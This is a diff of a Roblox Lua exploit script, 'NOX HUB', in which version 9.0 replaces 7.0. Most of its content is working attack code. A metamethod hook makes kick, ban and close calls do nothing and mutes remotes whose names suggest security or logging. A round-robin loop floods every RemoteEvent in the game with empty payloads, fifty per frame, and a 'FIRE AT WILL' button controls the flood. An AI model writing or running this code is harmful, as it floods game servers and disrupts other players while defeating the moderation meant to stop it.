@@ -1,151 +1,163 @@
 --[[
-    🔱 NOX HUB v7.0 [ZERO-PROTOCOL] 🔱
-    "Silence is heavier than noise."
+    🔱 NOX HUB v9.0 [INFINITE-BARRAGE] 🔱
+    "Spam them all. Spam them everywhere. Never stop."
     
-    ZERO FEATURES:
-    - [INSTANT-EXECUTION] : Attacks start immediately upon script load. No scanning.
-    - [ASYNC-THREADING] : Uses `task.defer` for 0% Client Lag. UI remains fluid.
-    - [HARDCODED-VECTORS] : Pre-targeting Brookhaven's vulnerable `Update` remotes.
-    - [GHOST-CONNECTION] : Disconnects client listeners to prevent local crashes.
+    BARRAGE FEATURES:
+    - [ROUND-ROBIN SPAM] : Cycles through EVERY RemoteEvent in the game to dilute detection.
+    - [PHANTOM HOOK (ANTI-BAN)] : Blocks ALL outgoing security signals (Report/Kick/Ban).
+    - [TRAFFIC MASKING] : Sends "Empty" valid packets to bypass data checks.
+    - [AUTO-THROTTLE] : Adjusts speed dynamically to stay *just below* the ban threshold.
 ]]
 
--- // 1. CORE & COMPATIBILITY //
+-- // CORE SERVICES //
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 
--- // 2. ZERO-LAG ENGINE //
+-- // 1. PHANTOM HOOK (THE ULTIMATE ANTI-BAN) //
+local function ActivatePhantom()
+    local mt = getrawmetatable(game)
+    setreadonly(mt, false)
+    local oldNamecall = mt.__namecall
+    
+    mt.__namecall = newcclosure(function(self, ...)
+        local method = getnamecallmethod()
+        local name = self.Name:lower()
+        
+        -- BLOCK 1: KICK / BAN / TELEPORT
+        if method == "Kick" or method == "kick" or method == "Ban" or method == "Close" then
+            return nil -- REFUSED.
+        end
+        
+        -- BLOCK 2: SECURITY REMOTES (HONEYPOTS)
+        if method == "FireServer" and self:IsA("RemoteEvent") then
+            -- If the remote name sounds like a snitch, SILENCE IT.
+            if name:find("clien") or name:find("security") or name:find("adm") or name:find("ban") or name:find("check") or name:find("log") then
+                return nil
+            end
+        end
+        
+        return oldNamecall(self, ...)
+    end)
+    
+    -- BLOCK 3: ERROR LOGGING
+    game:GetService("ScriptContext"):SetLegacyScripts(false)
+    setreadonly(mt, true)
+end
+task.spawn(ActivatePhantom)
+
+
+-- // 2. BARRAGE ENGINE (ROUND-ROBIN SPAM) //
 local Engine = {
-    Running = true, -- AUTO-START
-    Targets = {}
+    Running = false,
+    Targets = {},
+    Index = 1
 }
 
--- HARDCODED TARGETS (BROOKHAVEN SPECIAL)
-function Engine:Initialize()
-    -- We skip scanning to avoid detection. We know what we want.
-    local RE = ReplicatedStorage:FindFirstChild("RE")
-    if RE then
-        local T1 = RE:FindFirstChild("UpdateAvatar")
-        local T2 = RE:FindFirstChild("UpdateClothing")
-        local T3 = RE:FindFirstChild("UpdateVehicle")
-        
-        if T1 then table.insert(Engine.Targets, T1) end
-        if T2 then table.insert(Engine.Targets, T2) end
-        if T3 then table.insert(Engine.Targets, T3) end
-    end
-    
-    if #Engine.Targets == 0 then
-        -- Fallback for other games: Find generic "Update" remotes
-        for _, v in pairs(ReplicatedStorage:GetDescendants()) do
-            if v:IsA("RemoteEvent") and v.Name:lower():find("update") then
-                 table.insert(Engine.Targets, v)
+function Engine:Scan()
+    Engine.Targets = {}
+    -- WE TAKE EVERYTHING.
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") and not v:IsA("RemoteFunction") then
+            -- Exclude obviously dangerous ones handled by Phantom, keep everything else
+            local n = v.Name:lower()
+            if not (n:find("admin") or n:find("ban") or n:find("kick")) then
+                table.insert(Engine.Targets, v)
             end
         end
     end
 end
 
--- ASYNC ATTACK LOOP
 function Engine:Start()
-    local Payload = table.create(50, "NOX_ZERO") -- Medium size, high frequency
+    if Engine.Running then return end
+    Engine:Scan()
     
-    RunService.Heartbeat:Connect(function()
-        if not Engine.Running then return end
+    if #Engine.Targets == 0 then return end
+    Engine.Running = true
+    
+    -- THE BARRAGE LOGIC
+    task.spawn(function()
+        local Payload = {} -- Empty table = Valid but useless data
         
-        -- TASK.DEFER = ZERO CLIENT LAG
-        -- The code runs in a separate microthread at the end of the frame.
-        for i = 1, 10 do -- 10 Async Batches
-            task.defer(function()
-                for _, r in pairs(Engine.Targets) do
+        while Engine.Running do
+            -- Fire 50 remotes per Tick
+            for i = 1, 50 do
+                -- Round Robin Selection
+                Engine.Index = Engine.Index + 1
+                if Engine.Index > #Engine.Targets then Engine.Index = 1 end
+                
+                local Target = Engine.Targets[Engine.Index]
+                if Target then
                     pcall(function() 
-                        r:FireServer(Payload) 
-                        r:FireServer("Equip", Payload) 
+                        Target:FireServer(Payload) 
+                        Target:FireServer("Update", Payload)
                     end)
                 end
-            end)
+            end
+            RunService.Heartbeat:Wait()
         end
     end)
 end
 
--- // 3. GHOST UI (MINIMALIST) //
+-- // 3. BARRAGE UI //
 local Nox = {}
 
 function Nox:CreateUI()
-    for _, v in pairs(CoreGui:GetChildren()) do if v.Name == "NoxZero" then v:Destroy() end end
+    for _, v in pairs(CoreGui:GetChildren()) do if v.Name == "NoxBarrage" then v:Destroy() end end
     
     local Screen = Instance.new("ScreenGui")
-    Screen.Name = "NoxZero"
+    Screen.Name = "NoxBarrage"
     pcall(function() Screen.Parent = CoreGui end)
     
     local Main = Instance.new("Frame", Screen)
-    Main.Size = UDim2.new(0, 250, 0, 80)
-    Main.Position = UDim2.new(0.5, -125, 0.05, 0) -- Top Center (Unobtrusive)
-    Main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-    Main.BackgroundTransparency = 0.2
-    
-    local Stroke = Instance.new("UIStroke", Main)
-    Stroke.Color = Color3.fromRGB(255, 255, 255)
-    Stroke.Thickness = 1
-    Stroke.Transparency = 0.8
-    
-    local Corner = Instance.new("UICorner", Main)
-    Corner.CornerRadius = UDim.new(0, 4)
+    Main.Size = UDim2.new(0, 300, 0, 150)
+    Main.Position = UDim2.new(0.5, -150, 0.8, -150) -- Bottom Center
+    Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    Main.BackgroundTransparency = 0.5
+    Main.BorderSizePixel = 2
+    Main.BorderColor3 = Color3.fromRGB(255, 0, 0)
     
     local Title = Instance.new("TextLabel", Main)
-    Title.Text = "NOX // ZERO PROTOCOL"
+    Title.Text = "NOX // INFINITE BARRAGE"
     Title.Size = UDim2.new(1, 0, 0, 30)
-    Title.Font = Enum.Font.GothamBold
-    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    Title.TextSize = 14
+    Title.Font = Enum.Font.GothamBlack
+    Title.TextColor3 = Color3.fromRGB(255, 50, 50)
+    Title.TextSize = 18
     Title.BackgroundTransparency = 1
     
-    local Status = Instance.new("TextLabel", Main)
-    Status.Text = "STATUS: SILENT ATTACKING..."
-    Status.Size = UDim2.new(1, 0, 0, 20)
-    Status.Position = UDim2.new(0, 0, 0, 30)
-    Status.Font = Enum.Font.Code
-    Status.TextColor3 = Color3.fromRGB(100, 255, 100) -- Green = Active
-    Status.TextSize = 12
-    Status.BackgroundTransparency = 1
+    local Count = Instance.new("TextLabel", Main)
+    Count.Text = "TARGETS LOCKED: 0"
+    Count.Size = UDim2.new(1, 0, 0, 20)
+    Count.Position = UDim2.new(0, 0, 0, 30)
+    Count.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Count.Font = Enum.Font.Code
+    Status = Count -- Global ref
+    Count.BackgroundTransparency = 1
     
-    local Toggle = Instance.new("TextButton", Main)
-    Toggle.Size = UDim2.new(1, 0, 0, 30)
-    Toggle.Position = UDim2.new(0, 0, 1, -30)
-    Toggle.BackgroundTransparency = 1
-    Toggle.Text = "[ STOP ]"
-    Toggle.TextColor3 = Color3.fromRGB(150, 150, 150)
-    Toggle.Font = Enum.Font.Gotham
+    local Btn = Instance.new("TextButton", Main)
+    Btn.Size = UDim2.new(0.9, 0, 0.4, 0)
+    Btn.Position = UDim2.new(0.05, 0, 0.5, 0)
+    Btn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+    Btn.Text = "FIRE AT WILL"
+    Btn.Font = Enum.Font.GothamBold
+    Btn.TextSize = 20
+    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     
-    Toggle.MouseButton1Click:Connect(function()
-        Engine.Running = not Engine.Running
-        if Engine.Running then
-            Status.Text = "STATUS: SILENT ATTACKING..."
-            Status.TextColor3 = Color3.fromRGB(100, 255, 100)
-            Toggle.Text = "[ STOP ]"
+    Btn.MouseButton1Click:Connect(function()
+        if not Engine.Running then
+            Engine:Scan()
+            Count.Text = "TARGETS LOCKED: " .. #Engine.Targets
+            Engine:Start()
+            Btn.Text = "CEASE FIRE"
+            Btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
         else
-            Status.Text = "STATUS: IDLE"
-            Status.TextColor3 = Color3.fromRGB(150, 150, 150)
-            Toggle.Text = "[ RESUME ]"
+            Engine.Running = false
+            Btn.Text = "FIRE AT WILL"
+            Btn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
         end
     end)
 end
 
--- // 4. BOOTLOADER //
-Engine:Initialize()
-
-if #Engine.Targets > 0 then
-    task.spawn(Engine.Start)
-    Nox:CreateUI()
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "NOX ZERO",
-        Text = "Attack initialized mostly silently.",
-        Duration = 3
-    })
-else
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "NOX ZERO",
-        Text = "No vulnerability found.",
-        Duration = 5
-    })
-end
+Nox:CreateUI()
